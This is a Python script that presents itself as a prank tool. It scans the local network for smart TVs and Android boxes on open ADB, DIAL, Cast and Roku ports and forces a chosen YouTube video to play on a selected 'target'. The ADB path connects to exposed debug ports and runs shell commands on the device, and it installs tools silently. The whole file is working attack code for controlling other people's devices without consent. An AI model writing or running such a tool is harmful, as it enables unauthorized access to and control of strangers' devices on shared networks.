from concurrent.futures import ThreadPoolExecutor, as_completed
import socket
import sys
import os
import re
import requests
import time

try:
    import pychromecast
    from pychromecast.controllers.youtube import YouTubeController
    HAS_CHROMECAST = True
except ImportError:
    HAS_CHROMECAST = False

def print_banner():
    banner = """
 ______   __  __     ______     ______     ______   __   __
/\\__  _\\ /\\ \\/\\ \\   /\\  == \\   /\\  ___\\   /\\__  _\\ /\\ \\ / /
\\/_/\\ \\/ \\ \\ \\_\\ \\  \\ \\  __<   \\ \\  __\\   \\/_/\\ \\/ \\ \\ \\'/
   \\ \\_\\  \\ \\_____\\  \\ \\_____\\  \\ \\_____\\    \\ \\_\\  \\ \\__|
    \\/_/   \\/_____/   \\/_____/   \\/_____/     \\/_/   \\/_/
     Let's play a prank with a video!"""
    print(banner)

def scan_network():
    print("[...] Searching...")

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        local_ip = s.getsockname()[0]
        s.close()
        ip_prefix = ".".join(local_ip.split(".")[:3]) + "."
    except Exception:
        ip_prefix = "192.168.1."

    devices = []
    ports_to_scan = [5555, 8008, 8009, 1900, 8060, 36866, 7676]

    def check_port(ip, port):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.5) 
            result = sock.connect_ex((ip, port))
            sock.close()
            if result == 0:
                if port == 5555:
                    dev_type = "Android Box (ADB)"
                elif port == 8008:
                    dev_type = "Smart TV (DIAL)"
                elif port == 8009:
                    dev_type = "Google Cast"
                elif port == 8060:
                    dev_type = "Roku TV Service"
                else:
                    dev_type = f"Smart TV/Media Render (Port {port})"
                return {"ip": ip, "port": port, "type": dev_type}
        except Exception:
            pass
        return None

    tasks = []
    for i in range(1, 255):
        ip = f"{ip_prefix}{i}"
        for port in ports_to_scan:
            tasks.append((ip, port))

    discovered_ips = set()
    with ThreadPoolExecutor(max_workers=100) as executor:
        futures = {executor.submit(check_port, ip, port): ip for ip, port in tasks}
        
        for future in as_completed(futures):
            res = future.result()
            if res:
                if res["ip"] not in discovered_ips:
                    discovered_ips.add(res["ip"])
                    devices.append(res)

    return devices

def extract_video_id(url):
    regex = r'(?:youtube\.com\/(?:[^\/]+\/.+\/|(?:v|e(?:mbed)?)\/|.*[?&]v=)|youtu\.be\/)([^"&?\\/\\s?#]{11})'
    match = re.search(regex, url)
    return match.group(1) if match else None

def play_via_adb(ip, video_id):
    if os.system("command -v adb > /dev/null 2>&1") != 0:
        os.system("pkg install android-tools -y > /dev/null 2>&1")

    os.system(f"adb disconnect {ip}:5555 > /dev/null 2>&1")
    os.system(f"adb connect {ip}:5555 > /dev/null 2>&1")

    cmd = f'adb shell am start -a android.intent.action.VIEW -d "https://youtu.be/{video_id}" > /dev/null 2>&1'
    os.system(cmd)
    return True

def play_via_dial(ip, video_id):
    url = f"http://{ip}:8008/apps/YouTube"
    payload = f"data=videos%2F{video_id}"
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    try:
        res = requests.post(url, data=payload, headers=headers, timeout=5)
        return res.status_code in [200, 201]
    except Exception:
        return False

def play_via_cast(ip, video_id):
    if not HAS_CHROMECAST:
        return False
    try:
        chromecasts, browser = pychromecast.get_chromecasts()
        cast = None
        for cc in chromecasts:
            if cc.cast_info.host == ip:
                cast = cc
                break
        if cast:
            cast.wait()
            yt = YouTubeController()
            cast.register_handler(yt)
            yt.play_video(video_id)
            browser.stop_discovery()
            return True
        browser.stop_discovery()
        return False
    except Exception:
        return False

def main():
    print_banner()
    devices = scan_network()

    if not devices:
        print("[-] No target found online.")
        return

    print("[!] Here's our target!")
    for index, dev in enumerate(devices, 1):
        print(f"    [{index}] [{dev['ip']}] [{dev['port']}] -> {dev['type']}")
    print("")

    try:
        choice = int(input("[?] Choose your goal: "))
        if choice < 1 or choice > len(devices):
            print("[!] Invalid selection!")
            return
    except ValueError:
        print("[!] Please enter a number!")
        return

    selected_dev = devices[choice - 1]

    youtube_url = input("[?] Enter the YouTube video link: ").strip()

    print("[...] Waiting for processing")
    video_id = extract_video_id(youtube_url)

    if not video_id:
        print("[!] Error: Could not extract YouTube Video ID!")
        return

    success = False
    if selected_dev["port"] == 5555:
        success = play_via_adb(selected_dev["ip"], video_id)
    elif selected_dev["port"] == 8009:
        success = play_via_cast(selected_dev["ip"], video_id)
    else:
        success = play_via_dial(selected_dev["ip"], video_id)

    if success:
        print(f"       Link: {youtube_url} successful")
        print("       The video has been played.")
    else:
        print("       [!] Failed to send command to the target TV.")

if __name__ == "__main__":
    main()

